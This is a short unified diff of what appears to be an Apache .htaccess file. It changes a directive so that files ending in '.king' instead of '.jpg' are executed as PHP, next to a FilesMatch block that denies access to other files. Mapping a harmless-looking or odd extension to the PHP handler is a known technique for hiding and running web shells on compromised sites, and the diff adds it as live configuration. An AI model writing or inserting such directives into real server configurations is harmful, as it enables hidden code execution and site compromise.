@@ -2,4 +2,4 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .king
